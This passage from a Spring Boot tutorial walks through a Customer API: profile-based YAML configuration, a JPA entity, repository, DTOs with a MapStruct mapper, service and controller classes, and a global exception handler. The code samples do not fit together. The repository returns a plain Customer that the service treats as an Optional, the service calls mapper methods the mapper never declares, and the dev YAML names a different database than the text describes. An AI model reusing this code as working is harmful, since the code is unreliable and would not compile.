- **In `application.yaml`**: You can specify the active profile directly in the `application.yaml` file using the
  `spring.profiles.active` property. This is useful for setting a default profile that will be used unless another is
  specified at runtime.
- **At Runtime**: You can also activate a profile at runtime by passing the `spring.profiles.active` property as a
  command-line argument or setting it as an environment variable.

### Best Practices

- **Keep It Simple**: Store common settings in the main `application.yaml` and use environment-specific files for
  configuration differences.
- **Use Profiles**: Profiles help manage different environments like development, testing, and production by allowing
  you to specify environment-specific configurations.
- **YAML Advantages**: The YAML format is preferred for its readability and ability to handle complex, hierarchical
  settings more gracefully than traditional properties files.

### Example `application.yaml` and `application-dev.yaml` files for Customer API

In this section, I provide two YAML configuration files to demonstrate some of the settings I use for a Spring Boot
project. These are just examples, and many other configurations are available depending on your project's needs. As I
continue to develop this project, I may add more configurations.

#### application.yaml

This file contains general settings that apply to all environments. Here’s a breakdown of the configurations used:

- **`server.port`**: Specifies the port on which the application will run. In this case, it’s set to `8088`. If you do
  not specify the port, the app will start on a `default port` which is `8080`.
- **`server.servlet.context-path`**: Defines the base URL path for the application. Here, it’s dynamically set to the
  artifact ID of the project.
- **`server.shutdown.graceful`**: Enables graceful shutdown, ensuring that the application completes ongoing requests
  before shutting down.
- **`spring.profiles.active`**: Indicates the active profile to be used. In this case, the development profile (`dev`)
  is active.
- **`spring.application.name`**: Sets the application name, dynamically pulled from the project configuration.
- **`spring.lifecycle.timeout-per-shutdown-phase`**: Configures the timeout for each shutdown phase, here set to
  `25 seconds`.
- **`spring.output.ansi.enabled`**: Controls ANSI output in the console, set to `always` to ensure colored output.
- **`springdoc.swagger-ui.path`**: Sets the path for accessing the Swagger UI, useful for API documentation.
- **`springdoc.title`** and **`springdoc.version`**: Define the title and version of the API documentation, again
  dynamically set based on project properties.
- **`openapi.output.file`**: Specify the file name of the swagger file that will be generated by `OpenApiConfig` class
  on start-up. It will be the documentation of the application.

```yaml
server:
  port: 8088
  servlet:
    context-path: '/@project.name@'
  shutdown: graceful

spring:
  profiles:
    active: dev # Specify the active profile

  application:
    name: '@project.name@'
  lifecycle:
    timeout-per-shutdown-phase: 25s

  output:
    ansi:
      enabled: always

springdoc:
  swagger-ui:
    path: /ui
  title: 'Customer API'
  version: '@springdoc-openapi-starter-webmvc-ui.version@'

openapi:
  output:
    file: 'openapi-@project.name@.json'
```

#### application-dev.yaml

This file contains settings specific to the development environment. Here's what each setting does:

- **`datasource.url`**: Configures the JDBC URL for the H2 database. In this example, the database is stored in a local
  file (`./data/customer-db`) with `AUTO_SERVER=true` to allow remote connections.
- **`datasource.username` and `datasource.password`**: Set the database username and password. The default username (
  `sa`) is used with no password.
- **`datasource.driver-class-name`**: Specifies the JDBC driver class for the H2 database.
- **`jpa.show-sql`**: Enables logging of SQL statements generated by Hibernate.
- **`jpa.properties.hibernate.format_sql`**: Formats SQL output to be more readable.
- **`jpa.properties.hibernate.dialect`**: Specifies the Hibernate dialect to use, which is set to `H2Dialect` for
  compatibility with the H2 database.
- **`jpa.generate-ddl`**: Automatically generates database schema (DDL) from JPA entities.
- **`jpa.hibernate.ddl-auto`**: Controls the behavior of schema generation at runtime, with `update` allowing for
  incremental updates to the schema.

### Notes:

- These configurations are just examples based on what I use in this project. There are many other configurations you
  can apply depending on your project's needs.
- As the project evolves, I may add more configurations to enhance functionality or address specific needs.
- Feel free to explore additional configurations and adjust these examples to fit your project requirements.

**Feedback and Contributions**: If you have suggestions or improvements, please share them. Collaboration is key to
refining this guide and making it a valuable resource for all developers.

```yaml
datasource:
  url: jdbc:h2:file:./data/notification-manager-db;AUTO_SERVER=true
  username: sa
  password:
  driver-class-name: org.h2.Driver
jpa:
  show-sql: true
  properties:
    hibernate:
      format_sql: true
      dialect: org.hibernate.dialect.H2Dialect
  generate-ddl: true
  hibernate:
    ddl-auto: update
```

---

## 9. Detailed Package Breakdown

### Entity Layer

- **Purpose**: The entity layer represents the database tables in the form of JPA entities. Each entity class typically
  maps to a single table in the database.

- **Package**: `entity`

- **Example Classes**:
    - `Customer.java`: Represents the `customers` table.

- **Key Annotations**:
    - `@Entity`: Marks a class as a JPA entity.
    - `@Table(name = ""table_name"")`: Specifies the name of the table in the database.
    - `@Id`: Indicates the primary key of the entity.
    - `@GeneratedValue(strategy = GenerationType.IDENTITY)`: Defines the strategy for primary key generation.

<details>
  <summary>View Customer code</summary>

```java
package com.ainigma100.customerapi.entity;

import jakarta.persistence.*;
import lombok.*;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;
import org.hibernate.proxy.HibernateProxy;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Objects;

@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
@Entity
@Table(name = ""customers"")
public class Customer {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String firstName;

    @Column(nullable = false)
    private String lastName;

    @Column(nullable = false, unique = true)
    private String email;

    private String phoneNumber;

    private LocalDate dateOfBirth;

    @CreationTimestamp
    @Column(nullable = false, updatable = false)
    private LocalDateTime createdDate;

    @UpdateTimestamp
    private LocalDateTime updatedDate;

    @Override
    public final boolean equals(Object o) {
        if (this == o) return true;
        if (o == null) return false;
        Class<?> oEffectiveClass = o instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass() : o.getClass();
        Class<?> thisEffectiveClass = this instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass() : this.getClass();
        if (thisEffectiveClass != oEffectiveClass) return false;
        Customer customer = (Customer) o;
        return getId() != null && Objects.equals(getId(), customer.getId());
    }

    @Override
    public final int hashCode() {
        return this instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass().hashCode() : getClass().hashCode();
    }
}
```

</details>

### Why Not Use `@Data`?

While `@Data` is a convenient annotation provided by Lombok that generates getters, setters, `toString()`, `equals()`,
and `hashCode()` methods, it is not recommended for use with JPA entities (I got this warning from JPA Buddy plugin).
Using `@Data` in JPA entities can lead to severe performance and memory consumption issues. Additionally, `@Data`
generates `equals()` and `hashCode()` methods that might not be suitable for entities, particularly in cases involving
entity relationships and lazy loading.

### Importance of `equals()` and `hashCode()`

- **`equals()`**: This method determines whether two instances are considered equal. For JPA entities, this typically
  means comparing the primary key (ID). Properly implementing `equals()` ensures that the entity behaves correctly when
  compared in collections or when managed by the persistence context.


- **`hashCode()`**: This method provides a hash code for the entity, which is essential for its use in hash-based
  collections like `HashSet` or `HashMap`. Properly implementing `hashCode()` ensures consistency and correctness when
  the entity is stored or retrieved from such collections.

For more details on why these methods are important and best practices for implementing them, you can find  
resources and discussions online.

### Additional Column Specification

You can also specify the name of the column in the database using the `@Column(name = ""column_name"")` annotation.
This is useful when the field name in the entity class differs from the column name in the database table.

**Example**:

```java

@Column(name = ""first_name"", nullable = false)
private String firstName;
```

**Note**: If you do not specify the column name and the property is in camelCase, the column name will automatically be
converted to snake_case in most databases. For example, if your entity has a field named `firstName`, it will be mapped
to a column named `first_name` by default.

<br><br>

### Repository Layer

- **Purpose**: The repository layer handles CRUD operations for entities using Spring Data JPA, allowing you to
  interact with the database without writing SQL.
- **Package**: `repository`
- **Example Class**:
    - `CustomerRepository.java`: Manages CRUD operations for the `Customer` entity.

- **Key Concepts**:
    - **`extends JpaRepository<Customer, Long>`**: By extending `JpaRepository`, Spring Boot automatically configures a
      repository bean for you. This bean is a proxy implementation of `SimpleJpaRepository`, which provides all the
      necessary CRUD operations and query methods for the `Customer` entity. No need for `@Repository` or `@Component`
      annotations—Spring handles the configuration.

<details>
  <summary>View CustomerRepository code</summary>

```java
package com.ainigma100.customerapi.repository;

import com.ainigma100.customerapi.entity.Customer;
import org.springframework.data.jpa.repository.JpaRepository;

public interface CustomerRepository extends JpaRepository<Customer, Long> {

    Customer findByEmail(String email);

}
```

</details>

### Query Methods Overview

Spring Data JPA offers several ways to write queries in your repository interfaces, including:

#### 1. Derived Query Methods

You can create simple queries by following naming conventions.

**Example**:

```java
List<Customer> findByLastName(String lastName);
```

<br>

#### 2. Custom Queries with @Query

For more complex queries, you can use the @Query annotation.

**Example**:

```java
import org.springframework.data.repository.query.Param;

@Query(""SELECT c FROM Customer c WHERE c.email = :email"")
Customer findByEmail(@Param(""email"") String email);
```

<br>

#### 3. Native Queries

You can write native SQL queries using the @Query annotation and providing an extra parameter `nativeQuery = true`.

**Example**:

```java
import org.springframework.data.repository.query.Param;

@Query(value = ""SELECT * FROM customers WHERE status = :status"", nativeQuery = true)
List<Customer> findByStatus(@Param(""status"") String status);
```

<br>

### When to Use Native Queries

- **Advantages**: Native queries can be useful when you need to leverage database-specific features, optimize
  performance, or execute complex SQL that might not be easily expressed in JPQL (Java Persistence Query Language).


- **Disadvantages**: However, native queries can reduce the portability of your application across different database
  systems since they are tied to a specific SQL dialect. They also bypass some of the safety checks and optimizations
  provided by JPQL, such as automatic mapping of query results to entities.


- **Best Practice**: Prefer using JPQL or derived query methods for most queries to maintain portability and leverage
  JPA's features. Use native queries only when necessary for performance optimization or when dealing with complex
  queries that JPQL cannot handle efficiently.

<br><br>

### DTOs and MapStruct

DTOs (Data Transfer Objects) are used to transfer data between the service layer and the controller layer. They are
simple POJOs (Plain Old Java Objects) that contain only the necessary data and are often used to decouple the internal
entity models from the external API contract.

#### Key Concepts:

- **DTO Usage**:
    - DTOs ensure that only relevant information is exposed to the client. They help in shaping the data according to
      the needs of the client while hiding unnecessary internal details.
    - DTOs can also include validation annotations, ensuring that the data received or sent is valid according to
      business rules.


- **MapStruct for Mapping**:
    - **Automatic Mapping**: MapStruct automatically maps fields with the same name between entity classes and DTOs. For
      fields with different names, you can use the `@Mapping` annotation.
    - **Custom and Complex Mappings**: Allows custom mappings for complex scenarios, including nested objects and
      expression-based mappings.
    - **Performance**: MapStruct is efficient, generating simple, plain Java code for mappings without using reflection,
      making it faster than many other frameworks.
    - **Null Handling and Collection Mapping**: Offers control over how null values are handled and supports mapping
      between collections, such as lists of entities to lists of DTOs.
    - **Flexible Integration**: Easily integrates with Spring or other dependency injection frameworks by customizing
      the component model.

**Note**: You can find more information on MapStruct online.

Below is an example of a DTO and a corresponding MapStruct mapper interface:


<details>
  <summary>View CustomerDTO code</summary>

```java
package com.ainigma100.customerapi.dto;

import lombok.*;

import java.time.LocalDate;

@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class CustomerDTO {

    private Long id;
    private String firstName;
    private String lastName;
    private String email;
    private String phoneNumber;
    private LocalDate dateOfBirth;

}
```

</details>

<details>
  <summary>View CustomerMapper code</summary>

```java
package com.ainigma100.customerapi.mapper;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.entity.Customer;
import org.mapstruct.Mapper;

import java.util.List;

@Mapper(componentModel = ""spring"")
public interface CustomerMapper {

    Customer toCustomer(CustomerDTO customerDTO);

    CustomerDTO toCustomerDTO(Customer customer);

    List<Customer> toCustomerList(List<CustomerDTO> customerDTOList);

    List<CustomerDTO> toCustomerDTOList(List<Customer> customerList);

}
```

</details>


<br><br>

### Service Layer

The service layer in a Spring Boot application contains the business logic of the application. It acts as an
intermediary
between the controller layer (handling HTTP requests) and the repository layer (interacting with the database).

#### Key Concepts:

- **Interface and Implementation**: It's a good practice to define a service interface and then provide its
  implementation.
  This approach promotes loose coupling and makes your code more modular and easier to test. The interface defines the
  contract for the service, while the implementation class contains the actual business logic.

  **Example**:
    - `CustomerService`: Interface that defines methods for customer-related operations.
    - `CustomerServiceImpl`: Implementation class that provides the logic for methods like retrieving customers,
      updating customer details, etc.


- **Returning DTOs**: The service layer should not return entities directly. Instead, it should return Data Transfer
  Objects (DTOs).
  DTOs are simple objects that carry data between layers. They are particularly useful for exposing only the necessary
  data to the client and for avoiding exposing the internal structure of your entities.

<details>
  <summary>View CustomerService code</summary>

```java
package com.ainigma100.customerapi.service;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.dto.CustomerSearchCriteriaDTO;
import org.springframework.data.domain.Page;

public interface CustomerService {

    CustomerDTO createCustomer(CustomerDTO customerDTO);

    CustomerDTO getCustomerById(Long id);

    CustomerDTO updateCustomer(Long id, CustomerDTO customerDTO);

    CustomerDTO updateCustomerEmail(Long id, CustomerEmailUpdateDTO emailUpdateDTO);

    void deleteCustomer(Long id);

}
```

</details>

<details>
  <summary>View CustomerServiceImpl code</summary>

```java
package com.ainigma100.customerapi.service.impl;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.entity.Customer;
import com.ainigma100.customerapi.exception.ResourceAlreadyExistException;
import com.ainigma100.customerapi.exception.ResourceNotFoundException;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.repository.CustomerRepository;
import com.ainigma100.customerapi.service.CustomerService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

@Slf4j
@RequiredArgsConstructor
@Service
public class CustomerServiceImpl implements CustomerService {

    private final CustomerRepository customerRepository;
    private final CustomerMapper customerMapper;

    @Override
    public CustomerDTO createCustomer(CustomerDTO customerDTO) {

        customerRepository.findByEmail(customerDTO.getEmail())
                .ifPresent(customer -> {
                    throw new ResourceAlreadyExistException(""Customer"", ""email"", customerDTO.getEmail());
                });

        Customer recordToBeSaved = customerMapper.customerDTOToCustomer(customerDTO);

        Customer savedRecord = customerRepository.save(recordToBeSaved);

        return customerMapper.customerToCustomerDTO(savedRecord);
    }

    @Override
    public CustomerDTO getCustomerById(Long id) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        return customerMapper.toCustomerDTO(recordFromDB);
    }

    @Override
    public CustomerDTO updateCustomer(Long id, CustomerDTO customerDTO) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        // just to be safe that the object does not have another id
        customerDTO.setId(recordFromDB.getId());

        Customer recordToBeSaved = customerMapper.toCustomer(customerDTO);

        Customer savedRecord = customerRepository.save(recordToBeSaved);

        return customerMapper.toCustomerDTO(savedRecord);
    }

    @Override
    public CustomerDTO updateCustomerEmail(Long id, CustomerEmailUpdateDTO emailUpdateDTO) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        recordFromDB.setEmail(emailUpdateDTO.getEmail());

        Customer savedRecord = customerRepository.save(recordFromDB);

        return customerMapper.customerToCustomerDTO(savedRecord);

    }

    @Override
    public void deleteCustomer(Long id) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        customerRepository.delete(recordFromDB);
    }
}
```

</details>


<br><br>

### Controller Layer

The controller layer in a Spring Boot application handles incoming HTTP requests and sends responses back to the client.
It acts as the entry point for the client, interacting with the service layer to process business logic and return the
appropriate data. **Note**: Do not add business logic in this class.

#### Key Concepts:

- **Using Wrapper Objects**:
    - It's a best practice to return a wrapper object from the controller rather than returning entities directly. A
      wrapper object can contain a DTO, along with metadata such as status codes, messages, or other relevant
      information.
    - **Advantages**:
        - **Encapsulation**: The wrapper object encapsulates the DTO and provides a consistent response format, which
          can be useful for clients to process responses reliably.
        - **Security**: By using DTOs inside wrapper objects, you avoid exposing the internal structure of your entities
          directly to the client. This helps in protecting sensitive information and reducing the risk of exposing
          unintended data.
        - **Flexibility**: Wrapper objects allow you to include additional information, such as error messages or
          pagination details, making your API responses more informative and easier to handle on the client side.

    - **Example**:
        - `APIResponse<CustomerDTO>`: A wrapper object that contains the `CustomerDTO` and additional metadata like
          status and messages.

    - **Wrapper Class for API Responses: `APIResponse<T>`**:
        - The `APIResponse<T>` class is a generic wrapper that can be used across different controllers in your
          application. It encapsulates the response data and adds useful metadata like status and error messages.
        - **Key Attributes**:
            - `status`: A string representing the status of the response (e.g., ""SUCCESS"" or ""FAILED"").
            - `errors`: A list of `ErrorDTO` objects that contain error details when a request fails.
            - `results`: The actual data (DTO) being returned by the API.

        - **Example**:
      ```java
      @Data
      @AllArgsConstructor
      @NoArgsConstructor
      @JsonInclude(JsonInclude.Include.NON_NULL)
      @Builder
      public class APIResponse<T> {
      
          private String status;
          private List<ErrorDTO> errors;
          private T results;
      
      }
      ```

This structured approach ensures that your application is well-organized, with clear separation of concerns between
different layers. It also makes your API more robust, secure, and easier to maintain.

#### HTTP Method Annotations:

- **`@GetMapping`**:
    - **Purpose**: Maps HTTP GET requests to a specific handler method. It is typically used to retrieve data from the
      server.
    - **Usage**: Do not include a request body in GET requests. Use path variables or query parameters to pass data to
      the server.
    - **Example**:
      ```java
      @GetMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> getCustomerById(@PathVariable(""id"") Long id) {
          // You will have your implementation
      }
      ```

- **`@PostMapping`**:
    - **Purpose**: Maps HTTP POST requests to a specific handler method. It is used to create new resources on the
      server.
    - **Usage**: Use `@RequestBody` to pass data in the request body when creating a new resource.
    - **Example**:
      ```java
      @PostMapping
      public ResponseEntity<APIResponse<CustomerDTO>> createCustomer(@Valid @RequestBody CustomerRequestDTO customerRequestDTO) {
          // You will have your implementation
      }
      ```

- **`@PutMapping`**:
    - **Purpose**: Maps HTTP PUT requests to a specific handler method. It is used to update an existing resource on the
      server.
    - **Usage**: Use `@RequestBody` to pass updated data in the request body. PUT typically replaces the entire
      resource.
    - **Example**:
      ```java
      @PutMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> updateCustomer(@PathVariable(""id"") Long id, @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {
          // You will have your implementation
      }
      ```

- **`@PatchMapping`**:
    - **Purpose**: Maps HTTP PATCH requests to a specific handler method. It is used to apply partial updates to a
      resource.
    - **Usage**: Use `@RequestBody` to pass only the fields that need to be updated. PATCH is useful when you want to
      modify only certain attributes of the resource without affecting the rest.
    - **Example**:
      ```java
      @PatchMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> partiallyUpdateCustomer(@PathVariable(""id"") Long id, @RequestBody CustomerEmailUpdateDTO customerEmailUpdateDTO) {
          // You will have your implementation
      }
      ```

- **`@DeleteMapping`**:
    - **Purpose**: Maps HTTP DELETE requests to a specific handler method. It is used to delete a resource from the
      server.
    - **Usage**: Typically does not require a request body. The resource to be deleted is usually specified in the path.
    - **Example**:
      ```java
      @DeleteMapping(""/{id}"")
      public ResponseEntity<APIResponse<String>> deleteCustomer(@PathVariable(""id"") Long id) {
          // You will have your implementation
      }
      ```

- **Difference Between `PUT` and `PATCH`**:
    - **PUT**: Replaces the entire resource with the new data provided. If some fields are not provided, they will be
      overwritten with null or default values.
    - **PATCH**: Applies partial updates to a resource. Only the fields provided in the request body will be updated,
      leaving the other fields unchanged.

<details>
  <summary>View CustomerController code</summary>

```java
package com.ainigma100.customerapi.controller;


import com.ainigma100.customerapi.dto.*;
import com.ainigma100.customerapi.enums.Status;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.service.CustomerService;
import io.swagger.v3.oas.annotations.Operation;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

@RequiredArgsConstructor
@RequestMapping(""/api/v1/customers"")
@RestController
public class CustomerController {

    private final CustomerService customerService;
    private final CustomerMapper customerMapper;


    @Operation(summary = ""Add a new customer"")
    @PostMapping
    public ResponseEntity<APIResponse<CustomerDTO>> createCustomer(
            @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {

        CustomerDTO customerDTO = customerMapper.customerRequestDTOToCustomerDTO(customerRequestDTO);

        CustomerDTO result = customerService.createCustomer(customerDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> response = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();

        return new ResponseEntity<>(response, HttpStatus.CREATED);
    }


    @Operation(summary = ""Find customer by ID"",
            description = ""Returns a single customer"")
    @GetMapping(""/{id}"")
    public ResponseEntity<APIResponse<CustomerDTO>> getCustomerById(@PathVariable(""id"") Long id) {

        CustomerDTO result = customerService.getCustomerById(id);

        // Builder Design pattern
        APIResponse<CustomerDTO> responseDTO = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }


    @Operation(summary = ""Update an existing customer"")
    @PutMapping(""/{id}"")
    public ResponseEntity<APIResponse<CustomerDTO>> updateCustomer(
            @PathVariable(""id"") Long id,
            @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {

        CustomerDTO customerDTO = customerMapper.customerRequestDTOToCustomerDTO(customerRequestDTO);

        CustomerDTO result = customerService.updateCustomer(id, customerDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> responseDTO = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }

    @Operation(summary = ""Partially update a customer's email"")
    @PatchMapping(""/{id}/email"")
    public ResponseEntity<APIResponse<CustomerDTO>> updateCustomerEmail(
            @PathVariable(""id"") Long id,
            @Valid @RequestBody CustomerEmailUpdateDTO emailUpdateDTO) {

        CustomerDTO result = customerService.updateCustomerEmail(id, emailUpdateDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> response = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();

        return new ResponseEntity<>(response, HttpStatus.OK);
    }


    @Operation(summary = ""Delete a customer by ID"")
    @DeleteMapping(""/{id}"")
    public ResponseEntity<APIResponse<String>> deleteCustomer(@PathVariable(""id"") Long id) {

        customerService.deleteCustomer(id);

        String result = ""Customer deleted successfully"";

        // Builder Design pattern
        APIResponse<String> responseDTO = APIResponse
                .<String>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }

}
```

</details>


<br><br>

### Exception Handling

In a Spring Boot application, it's important to handle exceptions in a way that provides meaningful feedback to the
client while maintaining a clean and maintainable codebase. In addition, you have to be sure not to expose sensitive
data.
The `GlobalExceptionHandler` class in this project serves this purpose by centralizing exception handling and ensuring
consistent error responses across the entire application.

#### Global Exception Handler

The `GlobalExceptionHandler` class, annotated with `@ControllerAdvice`, intercepts exceptions thrown by any controller
in the application. This class defines several `@ExceptionHandler` methods to handle specific types of exceptions,
ensuring that the application responds with appropriate HTTP status codes and error messages.

**Key Features of `GlobalExceptionHandler`:**

- **Runtime Exceptions**: Handles general runtime exceptions, such as `NullPointerException` and `RuntimeException`,
  returning a 500 Internal Server Error response.
- **Resource Not Found**: Manages `ResourceNotFoundException`, returning a 404 Not Found status with a relevant error
  message.
- **Business Logic and Data Exceptions**: Handles custom exceptions like `ResourceAlreadyExistException`, and
  `DataAccessException`, providing a 400 Bad Request response.
- **Validation Exceptions**: Manages exceptions related to validation, such as `MethodArgumentNotValidException` and
  `ConstraintViolationException`, returning detailed validation error messages.
- **Malformed JSON**: Handles `HttpMessageNotReadableException` to catch and respond to improperly formatted JSON in
  requests.
- **Method Not Supported**: Catches `HttpRequestMethodNotSupportedException`, responding with a 405 Method Not Allowed
  status.

#### Custom Exceptions

The application also defines several custom exceptions to manage specific error scenarios:

- **`BusinessLogicException`**: Thrown when a business rule is violated.
- **`ResourceAlreadyExistException`**: Used when an attempt is made to create a resource that already exists.
- **`ResourceNotFoundException`**: Thrown when a requested resource is not found in the database.

These custom exceptions extend `RuntimeException` and are annotated with `@ResponseStatus` to map them to specific HTTP
status codes.

#### Structured Error Responses

To ensure that error responses are consistent, the `APIResponse` class is used to structure the response body. It
includes:

- **Status**: A string indicating the outcome of the request (e.g., ""FAILED"").
- **Errors**: A list of `ErrorDTO` objects, each containing a `field` and an `errorMessage` to describe the issue.

This structure ensures that clients receive clear and consistent error messages, which can be easily parsed and handled.

**Note**: This approach to exception handling improves the robustness of the application, making it more maintainable
and user-friendly. For more details on how to implement and extend this global exception handler, you can refer to
additional resources or documentation available online.


<details>
  <summary>View GlobalExceptionHandler code</summary>

```java
package com.ainigma100.customerapi.exception;

import com.ainigma100.customerapi.dto.APIResponse;
import com.ainigma100.customerapi.dto.ErrorDTO;
import com.ainigma100.customerapi.enums.Status;
import jakarta.validation.ConstraintViolation;
import jakarta.validation.ConstraintViolationException;
import lombok.extern.slf4j.Slf4j;
import org.springframework.dao.DataAccessException;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.http.converter.HttpMessageNotReadableException;
import org.springframework.validation.FieldError;
import org.springframework.web.HttpRequestMethodNotSupportedException;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.MissingPathVariableException;
import org.springframework.web.bind.MissingServletRequestParameterException;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

@Slf4j
@ControllerAdvice
public class GlobalExceptionHandler {


    @ExceptionHandler({RuntimeException.class, NullPointerException.class})
    public ResponseEntity<Object> handleRuntimeExceptions(RuntimeException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""An internal server error occurred"")));

        log.error(""RuntimeException or NullPointerException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.INTERNAL_SERVER_ERROR);
    }


    @ExceptionHandler({ResourceNotFoundException.class})
    public ResponseEntity<Object> handleResourceNotFoundExceptions(ResourceNotFoundException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""The requested resource was not found"")));

        log.error(""ResourceNotFoundException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.NOT_FOUND);
    }


    @ExceptionHandler({ResourceAlreadyExistException.class, DataAccessException.class})
    public ResponseEntity<Object> handleOtherExceptions(Exception exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""An error occurred while processing your request"")));

        log.error(""ResourceAlreadyExistException or DataAccessException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.BAD_REQUEST);
    }


    @ExceptionHandler(HttpRequestMethodNotSupportedException.class)
    public ResponseEntity<Object> handleHttpRequestMethodNotSupportedException(HttpRequestMethodNotSupportedException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""The requested URL does not support this method"")));

        log.error(""HttpRequestMethodNotSupportedException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.METHOD_NOT_ALLOWED);
    }


    @ExceptionHandler({MethodArgumentNotValidException.class, MissingServletRequestParameterException.class, MissingPathVariableException.class})
    public ResponseEntity<Object> handleValidationExceptions(Exception exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());

        List<ErrorDTO> errors = new ArrayList<>();
        if (exception instanceof MethodArgumentNotValidException ex) {

            ex.getBindingResult().getAllErrors().forEach(error -> {
                String fieldName = ((FieldError) error).getField();
                String errorMessage = error.getDefaultMessage();
                errors.add(new ErrorDTO(fieldName, errorMessage));
            });

        } else if (exception instanceof MissingServletRequestParameterException ex) {

            String parameterName = ex.getParameterName();
            errors.add(new ErrorDTO("""", ""Required parameter is missing: "" + parameterName));

        } else if (exception instanceof MissingPathVariableException ex) {

            String variableName = ex.getVariableName();
            errors.add(new ErrorDTO("""", ""Missing path variable: "" + variableName));
        }

        log.error(""Validation errors: {}"", errors);

        response.setErrors(errors);
        return new ResponseEntity<>(response, HttpStatus.BAD_REQUEST);
    }


    @ExceptionHandler(HttpMessageNotReadableException.class)
    public ResponseEntity<APIResponse<ErrorDTO>> handleHttpMessageNotReadableException(HttpMessageNotReadableException ex) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""Malformed JSON request"")));

        log.error(""Malformed JSON request: {}"", ex.getMessage());

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }


    @ExceptionHandler(ConstraintViolationException.class)
    public ResponseEntity<APIResponse<ErrorDTO>> handleConstraintViolationException(ConstraintViolationException ex) {

        List<ErrorDTO> errors = new ArrayList<>();

        for (ConstraintViolation<?> violation : ex.getConstraintViolations()) {
            errors.add(new ErrorDTO(violation.getPropertyPath().toString(), violation.getMessage()));
        }

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(errors);

        log.error(""Constraint violation errors: {}"", errors);

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }


}
```

</details>



---

## 10. Helper Classes

In this section, I provide some helper classes that can be reused in Spring Boot applications. These classes are
designed
to simplify common tasks such as logging, server configuration, and OpenAPI documentation generation.

### OpenApiConfig

This configuration class is responsible for generating OpenAPI documentation using SpringDoc. It fetches the OpenAPI
JSON from the application's endpoints and saves it as a formatted file.

**Key Features**:

- Automatically generates OpenAPI documentation in JSON format.
